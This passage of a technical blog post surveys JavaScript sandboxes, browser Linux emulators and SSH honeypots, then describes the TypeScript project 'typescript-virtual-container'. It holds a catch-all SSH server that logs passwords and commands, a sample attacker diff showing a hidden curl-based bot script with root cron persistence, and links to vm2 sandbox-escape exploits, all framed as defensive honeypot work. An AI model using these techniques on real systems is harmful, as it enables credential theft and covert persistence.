    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Let everyone in
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Fake reply
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

That "works" in that it captures creds and commands. But it's obviously fake as soon as a sophisticated attacker digs a bit. `uname -a` returns the right string but `ls /etc` returns "command not found" -- that smells like a trap. There's no filesystem. Commands don't chain. Pipes don't work. Variables don't expand.

A competent attacker fingerprints your honeypot within the first five commands. Automated scripts looking for Cowrie-like behavior spot it immediately too. That's apparently what pushed the author of `typescript-virtual-container` to build something that actually interprets commands for real -- more on that in Part 5.

---

### Honeypot family summary

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naive ssh2 |
|---|---|---|---|---|---|---|
| **Interaction level** | medium-high | medium | zero | zero | variable | low |
| **Real SSH protocol** | ✅ | ✅ | ❌ (tarpit) | ✅ | variable | ✅ |
| **Shell fidelity** | medium | medium | n/a | none | variable | minimal |
| **Captures creds** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Captures commands** | ✅ | ✅ | ❌ | ✅ | variable | ✅ |
| **Captures malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM integration** | ✅ native | ❌ | ❌ | ❌ | ❌ | manual |
| **LLM replies** | ✅ (new) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Language** | Python | Python | C | Go | Docker | Node.js |
| **Node.js native** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ very active | ⚠️ archived | ✅ active | ✅ active | ✅ active | DIY |

The pattern here is pretty clear: the more fidelity you want, the more Python you have to write. Cowrie is the undisputed winner if you're doing this seriously -- it's been battle-tested in the field for years and captures way more than just creds. endlessh and sshesame are fun side projects more than serious threat-intel tools. And the naive Node.js approach gets you maybe 20% of the way before you hit a wall.

---

## Part 5 -- `typescript-virtual-container`: what fills the gap

OK so here's where things get interesting. After cataloging all the families above, the missing quadrant becomes pretty obvious:

- JS sandboxes: isolate code, no shell, no filesystem, no SSH
- Linux emulators: real OS, real shell, real SSH... but 150+ MB RAM, 30-second boot, and you have to build your own API on top of serial I/O
- Honeypots: fake shell, no programmable API, Python/Go/C, not Node-native

Nobody had built a full programmable Node-native Linux environment, with real SSH, real permissions, a real virtual network, and a typed TypeScript API. So she built it.

Quick intro since it's the first time I'm properly mentioning her: `typescript-virtual-container` was built by [Chloé Rolzhausen](https://itsrealfortune.fr), a French developer who goes by **Fortune** (or ItsRealFortune) online. You can find her on her [website](https://itsrealfortune.fr) and on [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b043316/). The whole project -- 56,000 lines of TypeScript, 247 files, 170 commands -- was a solo effort by a single person. I'll call her Fortune for the rest of the article. And yes, that's pretty wild. Go check out her work!

### What it actually is

`typescript-virtual-container` is a **Linux environment simulator** written in pure TypeScript. No Wasm, no native extensions, no kernel. ~56,000 lines of source across 247 TypeScript files.

The key insight: you don't need a CPU emulator to make `ls /etc | grep root` work. You need:
1. A tree of in-memory nodes answering path operations
2. A POSIX permission model enforced on every access
3. A shell parser understanding pipelines, redirections, subshells, and variable expansion
4. ~170 command implementations (functions, not binaries)
5. A user and group management system
6. Something to expose it all over SSH

All of that is doable in pure TypeScript with zero kernel involvement.

### The VirtualFileSystem

The VFS is an in-memory tree of typed nodes -- no disk I/O unless you explicitly enable `"fs"` persistence mode:

```ts
// Simplified internal representation
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // lazily loaded placeholder
```

Every path operation goes through `normalizePath` (resolving `.`, `..`, symlinks) and `enforceAccess` (checking read/write/execute permissions against the requesting uid/gid). `chmod`, `chown`, sticky bits, and setuid are all implemented and actually enforced. If a process running as uid 1000 tries reading a root-owned file with mode 0600, it gets EACCES -- not a fake EACCES, a real JavaScript `Error` thrown from the permission check. That part is pretty elegant honestly.

The VFS serializes to:
- `.vfsb` -- a compact binary format (custom, with fflate compression) -- the default format
- JSON snapshot -- human-readable, good for debugging
- TAR archive -- import/export with the real tar format, so you can `tar -xf` something and the VFS just... has those files
- SquashFS image -- read-only import

In `"fs"` persistence mode, it maintains a write-ahead log (WAL) for crash recovery -- writes go to the journal first, then to the snapshot on flush. If Node crashes mid-op, the journal lets you rebuild the last complete state.

There's also a `FileCache` layer simulating disk I/O latency. You configure profiles like `NVME_DISK_IO` or `HDD_DISK_IO` and the VFS artificially delays file ops to match realistic timings. Which is pretty funny -- software deliberately slowing itself down to simulate hardware -- but actually very useful for benchmarking.

### The shell interpreter

The shell parser produces a typed AST:

```ts
// "ls /etc | grep root && echo done" parses to:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

The executor walks that AST:
- For a pipeline, it creates a `{ stdin, stdout, stderr }` stream chain and runs each command with pipelined I/O
- For logic operators (`&&`, `||`), it checks `$?` after the left side before running the right
- For subshells (`$(...)`, `` ` ` ``), it forks the execution context
- For redirections (`>file`, `>>file`, `2>&1`, `<file`), it wires stream plumbing before running
- For background jobs (`cmd &`), it runs without waiting for completion
- For variables, it expands `$VAR`, `${VAR:-default}`, `${#VAR}`, and arithmetic `$((expr))`
- For brace expansion (`{a,b,c}`, `{1..5}`), it generates the full expansion list before running

All of that is real POSIX shell behavior. The parser handles heredocs, process substitution, globbing (`*`, `?`, `[abc]`), and quoting (single quotes, double quotes with interpolation, backslash escaping). It's not perfect -- edge cases exist -- but it's way beyond what you'd expect from a TypeScript project.

### ~170 built-in commands

Commands are TypeScript functions registered in a command registry. They receive a `CommandContext` with stdin/stdout/stderr streams, the VFS, the user session, the shell env, and access to submodules.

Writing 170 Unix command implementations is... a lot. Some are trivial (`echo`, `true`, `false`), some are surprisingly complex (`awk`, `find`, `tar`). Like, a full POSIX `awk`? In TypeScript? That's honestly wild. Here's a sample of what's in there:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (client-side, outgoing),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (full interactive editor), vim (basic), vi (basic),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulated), systemctl (stub), journalctl (stub),
...and about 130 more
```

The "stubs" (git, python3, node) answer common invocations realistically -- `python3 --version` returns a believable version string, `git status` shows fake repo state -- without doing any real work. For a honeypot, those are actually more useful than real commands, because they let you observe what attackers try running without running anything dangerous.

### The SSH server

The SSH layer uses the real `ssh2` npm package -- real SSH protocol, real key exchange, real encryption. `SSHMimic` wraps it:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Real SSH: ssh -p 2222 root@localhost
// Real SFTP: sftp -P 2222 root@localhost
// Real SCP: scp -P 2222 file root@localhost:/tmp/
```

The `shellProperties` determine what `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, and `/etc/os-release` report. You can convincingly mimic any Linux distro and kernel version -- to a real SSH client, there's literally no way to tell the difference.

### The HoneyPot module

Because the shell interpreter is real and the SSH server is real, attackers' commands genuinely execute in the virtual environment. Attacker-triggered `wget` requests get logged with destination URLs. Files the attacker creates get saved in the VFS. The attacker's privilege escalation attempts produce realistic errors.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// After a session, diff the filesystem
const before = shell.vfs.toSnapshot();
// ... attacker session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

That's qualitatively different from Cowrie. Cowrie's fake filesystem can answer `ls` but can't actually track files an attacker created and the changes they made as a structured diff. `typescript-virtual-container` can, because the VFS is a living data structure -- every write is tracked. That cron entry the attacker just added? It's in the diff. That `.hidden` folder? In the diff. Pretty useful for malware analysis.

### The virtual network stack

That's probably the most impressive part of the whole project, and it has no equivalent in any other project in this space. Like, a full L2/L3 virtual network stack with VPN support, written in pure TypeScript, with no real NIC involved. It's truly wild.

`VirtualNetworkManager` gives each `VirtualShell` instance virtual network interfaces with configurable IP addresses, routing tables, and a software firewall (iptables-style rules with conntrack and NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` all show the virtual network's state.

`VirtualSwitch` (named Baie -- from the French word for server rack, "baie informatique") connects several shells on a shared subnet. It implements:
- MAC and ARP learning
- IP routing between subnets
- NAT (outgoing masquerade)
- DNS (per-subnet configurable records)
- Load balancing (round-robin, least connections)
- Traffic shaping: latency, jitter (Gaussian distribution), packet loss, burst loss, reordering, duplication
- Bandwidth capping (token bucket)
- MTU enforcement
- Connection tracking (with state, NEW/ESTABLISHED/TIME_WAIT states)

```ts
const baie = new Baie("192.168.0.0/24");

// Three virtual machines on the same switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web can reach api, api can reach db, web cannot reach db directly
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Traffic shaping: simulate an unstable WAN link outward
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` creates encrypted tunnels between Baie instances -- you can simulate a multi-site network with site-to-site VPN interconnections.

`VirtualProxy` implements port forwarding and a SOCKS5 proxy.

None of that touches a real NIC. It's all TypeScript object routing. The `ping` command "works" by routing through the virtual switch and returning simulated ICMP replies. `curl http://192.168.0.3/api` routes through the virtual network, reaches the api shell's simulated HTTP reply, and returns the content. It's turtles all the way down, in the best possible way.

### The `SandboxedShell`

For programmatic use where you need stronger isolation, `SandboxedShell` runs a shell session in a Node.js Worker thread:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% of one core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Isolation here comes from the VFS layer (the worker thread's shell can only see the virtual filesystem, never the host filesystem) plus Node.js Worker thread memory isolation. It's lighter than `isolated-vm` but more appropriate for shell-level rather than JS-level isolation.

### Resource capping

You can configure per-shell resource limits affecting what system monitoring commands report:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Inside that shell, `free -m` shows 512 MB total RAM. `nproc` returns 2. `/proc/meminfo` shows the capped values. `htop` and `top` show the capped CPU count. That lets you precisely define the simulated machine's hardware footprint.

### Three deploy modes

```
Mode 1: SSH/SFTP server
  VirtualSshServer / VirtualSftpServer
  → Real SSH protocol, real SFTP, real SCP
  → Use case: honeypots, remote test environments, training labs

Mode 2: Web shell (browser)
  builds/fortune-nyx-v1.7.8-web.min.js (ESM bundle)
  → Runs in the browser, VFS persisted in IndexedDB
  → Use case: interactive tutorials, embedded terminals, demos
  → Bonus: run startxfce4 for a full simulated XFCE desktop

Mode 3: Standalone CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (single file, no install)
  → curl and run, VFS persisted in the .vfs/ directory
  → Use case: quick demos, local experimentation
```

### The polyfills -- how the browser build works without Wasm

OK this is the part I find really clever and wanted to specially highlight.

Making a Node.js library run in the browser is usually a nightmare. You either use a Wasm runtime (heavy, slow to load), or you spend weeks manually replacing each `node:*` import with a browser-compatible alternative. Fortune did the second thing -- but very cleanly, by writing a set of custom polyfills living in the repo's `polyfills/` directory.

The build pipeline is just esbuild with a bunch of `alias` entries:

```js
// demo/build.js -- the whole browser build config
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

No Wasm, no external polyfill library, no `webpack-node-externals` recourse. Just aliased modules and a couple injected globals. Let me detail each because some are genuinely impressive.

**`node:fs` -- IndexedDB as a fake filesystem**

This one is my favorite. The `node:fs` polyfill implements the sync Node.js fs API (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) backed by two layers: an in-memory `Map` for sync reads, and IndexedDB for persistence across page reloads. Writes go into the Map immediately (so `readFileSync` right after `writeFileSync` always works), then get flushed to IndexedDB asynchronously in the background.

```js
// Sync cache (path → Uint8Array | null) -- instant reads
const memCache = new Map();

// Preload everything from IndexedDB into memCache at startup
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

That's why the VFS snapshot survives page reloads in the browser -- the whole `.vfsb` binary gets written into IndexedDB via that polyfill, and re-read on next load. No Wasm, no server. Just IndexedDB, which has been in every browser since 2011.

**`node:crypto` -- SHA-256 in pure JS**

Instead of importing a Wasm crypto library, the crypto polyfill implements SHA-256 from scratch using FIPS 180-4 round constants. 166 lines of pure JS with full hex/base64/Uint8Array output support. All hashing in the library goes through it -- SSH host key fingerprints, internal checksums, everything. Compact, zero dependency, it works.

**`node:os` -- reads the browser's real hardware**

This one is a nice touch. Instead of returning hardcoded fake values, `node:os` reads `navigator.deviceMemory` for total RAM and `navigator.hardwareConcurrency` for CPU count. So `neofetch` in the browser build actually reports something matching your real machine -- not a bogus `2 cores, 2 GB RAM` stub.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB fallback
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // also parses navigator.userAgent to guess the CPU model string
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- honest stubs**

The browser can't open raw TCP sockets or run real SSH, so those are stubs throwing a `NotImplemented` error with a clear message if anything tries using them. Failures stay explicit, no `undefined` returned where an object is expected. Just a strong clear message "this doesn't work in the browser" -- which is exactly what you want.

**`process.js` and `buffer.js` -- injected globals**

Those two are injected at the top of every bundle file via esbuild's `inject` option, so `process` and `Buffer` are globally available with no explicit import. `process.js` is tiny: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` is a full `Buffer` reimplementation on top of `Uint8Array` -- all the `readUInt32BE`, `writeInt16LE` methods, the hex/base64 encodings the SSH implementation and VFS depend on.

---

The whole polyfill set is about 640 lines of hand-written JS total. No npm packages, no Wasm. And the result is a browser bundle that's just the library, running natively, with none of the usual "but does it really work in the browser?" anxiety you get with Node-first libraries. It's worth browsing the `polyfills/` folder in the repo directly if you're curious -- each file is self-contained and readable on its own, which is a style choice I appreciate a lot.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Category** | JS sandbox | JS sandbox | JS sandbox | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Isolates JS** | ⚠️ scope | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | partial | n/a | ✅ Worker |
| **Real Linux kernel** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell interpreter** | ❌ | ❌ | ❌ | ✅ (real) | ✅ (real) | ✅ (real) | partial | ✅ (custom) |
| **~170 Unix commands** | ❌ | ❌ | ❌ | ✅ | ✅ | partial | ~20 | ✅ |
| **POSIX permissions** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | partial | ✅ enforced |
| **User management** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ full |
| **Real SSH server** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS diff/snapshot** | ❌ | ❌ | ❌ | limited | ❌ | ❌ | ❌ | ✅ |
| **L2/L3 virtual network** | ❌ | ❌ | ❌ | basic | ❌ | ❌ | ❌ | ✅ full |
| **Virtual VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Browser support** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js native** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Typed API** | basic | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ full |
| **Binary compat** | n/a | n/a | n/a | ✅ | ✅ | partial | n/a | ❌ |
| **Boot time** | instant | instant | instant | 15-40s | 15-40s | 2-5s | instant | <1s |
| **RAM/instance** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Runtime deps** | 0 | 1 (native) | 1 (Wasm) | 0 | proprietary | 1 | Python deps | 3 (ssh2, ws, fflate) |
| **Status** | stable | ✅ active | ✅ active | ✅ very active | commercial | ✅ active | ✅ active | ✅ active |

---

## When to Use What

**You need to run untrusted JavaScript -- a user-submitted formula, a plugin, a script hook.**
→ `isolated-vm`. Real V8 Isolate, strict memory limits, explicit communication bridge. Avoid `vm2` -- the CVE list just keeps growing, seriously it's like a new one every few months. Avoid `vm` -- it's not a sandbox at all, please.

**You need to isolate JS and don't want a native extension, or need browser compatibility.**
→ `quickjs-emscripten`. Wasm boundary, ~500 KB module, works in browsers and Node. Slower than V8 but really isolated.

**You need to boot a real unmodified Linux OS with binary compatibility.**
→ `v86` for 32-bit Linux, or `container2wasm` if you have an existing Docker image. Accept 150+ MB RAM and 30 seconds of boot, that's the deal. If you need 64-bit, look at CheerpX or just use a real container runtime.

**You need to embed a Linux-like terminal in a web app with no backend.**
→ `v86` (full OS, heavy, slow to boot) or the `typescript-virtual-container` browser bundle (simulator, lighter, instant boot, includes `startxfce4` for a full desktop which is pretty cool for that matter).

**You need online interactive coding tutorials or a browser IDE.**
→ WebContainers if you're focused on the Node.js ecosystem. CheerpX if you need a real Linux userspace. The `typescript-virtual-container` browser bundle if you want a lighter option with a typed API.

**You want to collect SSH attacker TTPs at scale.**
→ Cowrie is the production standard, period. Runs on any Linux server, integrates with every SIEM, has an LLM mode now. Just use Cowrie.

**You want SSH honeypot data in a Node.js app with a programmable API.**
→ `typescript-virtual-container`. Commands genuinely execute. The VFS is a real data structure you can instantly snapshot and diff. The attacker gets a convincing interactive environment, and you get structured audit data without leaving Node.

**You need shell automation / CI tests without Docker.**
→ `typescript-virtual-container`. Boots in under a second, snapshot before a test, restore after. Run shell commands with a typed API. No Docker daemon, no kernel, no VM, no wait.

**You need multi-tenant shell environments (SaaS, education, training).**
→ `typescript-virtual-container`. 5-20 MB per instance vs. 150-256 MB for an emulator. 100 simultaneous users: ~2 GB vs. ~25 GB. That's a big hosting-cost difference!

**You need a realistic honeypot that also lets you build a multi-VM network lab.**
→ `typescript-virtual-container` is the only thing in this space doing both.

---

## What It Can't Do (and I Want to Be Honest About That)

It can't run native x86 binaries. If you need to compile C code, run a real Python interpreter, or use software compiled for Linux, there's no kernel ABI backing those syscalls. Commands like `gcc`, `python3`, and `node` are stubs -- they answer `--version` and common invocations, but run nothing real.

That's the fundamental tradeoff: you gain 10 to 50x less memory, instant boot, browser compatibility, a typed API, real SSH, and virtual networking -- and you give up binary compatibility with the Linux userspace.

Fortune thought hard about that designing the project. For the use cases she targeted -- honeypots, tests, embedded terminals, CI environments -- running a compiled binary is actually never needed. Shell pipelines, file manipulation, network routing, and SSH cover everything. But if your use case needs real compiled software, `v86` or Docker is the right answer, not this.

---

## To Conclude

So there it is. This ecosystem is bigger and more fragmented than it looks from outside. `vm` is a scope separator, not a sandbox. `vm2` keeps stacking CVEs (for real, look at this month's advisories). `isolated-vm` is the right answer for JS isolation but JS only. `quickjs-emscripten` is the right pick when you need browser compat or want to avoid native extensions. `v86` and CheerpX are real emulators when you need real binary compat. WebContainers is Node.js in Wasm, not a general Linux environment. Cowrie is the SSH honeypot gold standard, but it's Python and not Node-native.

And then there's `typescript-virtual-container` -- Fortune's project -- which lives in a category of its own a bit. Neither emulator, nor JS sandbox, nor passive honeypot. Something in between that turned out surprisingly useful for lots of things none of the others can do.

`typescript-virtual-container` fills the gap none of the others touch: a full programmable Linux shell environment with real SSH, SFTP, POSIX permissions, user management, virtual networking, and a typed TypeScript API -- running in about 10 MB, booting in under a second, working in both Node.js and the browser.

If you want to try it: source code is at [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) and there's an online demo (including `startxfce4` for a full desktop, which is honestly sick) at [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Go check it out and drop some stars for Fortune on GitHub, she deserves them!

Thanks for reading -- this one was a long one even by my standards :) hope it helped you!

---

## Sources

I tried linking every claim to a primary source -- official docs, CVE advisories, GitHub repos, maintainer blog posts. A few notes: the vm2 CVE list keeps growing so the FortiGuard link might be stale by the time you read this (check the GitHub advisories page for the latest ones). Bellard's links are all stable -- his personal site has been there forever and content doesn't change. And if you want to dig into any of the polyfills, just browse the `polyfills/` folder in the `typescript-virtual-container` repo directly -- it's more readable than any description I could write here.

### JavaScript Sandboxes

- **Node.js `vm` module** -- official docs: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` security warning** -- "The vm module is not a security mechanism. Do not use it to execute untrusted code": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE timeline** -- FortiGuard alert with the full CVE list and dates: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Async error escape, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Exploit DB entry with full PoC: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026 vm2 CVEs** -- 11 new escapes, analysis: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- oxeye.io post-mortem on CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate internals** -- Embedder's guide: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS engine** -- by Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno permission model** -- docs: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 release** -- October 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm proposal** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments proposal** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Andrew Healey's practical article on the Deno sandbox approach: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux Emulators

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **v86 OS support matrix** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS used by v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE extensions** (VGA reference) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Bellard's emulator: [bellard.org/jslinux](https://bellard.org/jslinux/) · Technical notes (TinyEMU, history, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- C source: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Unofficial GitHub mirrors: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- JS OpenRISC emulator: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- docs: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads guide: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API docs: [webcontainers.io](https://webcontainers.io) · Announcement: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ preview: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT blog post: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison's article: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal stack

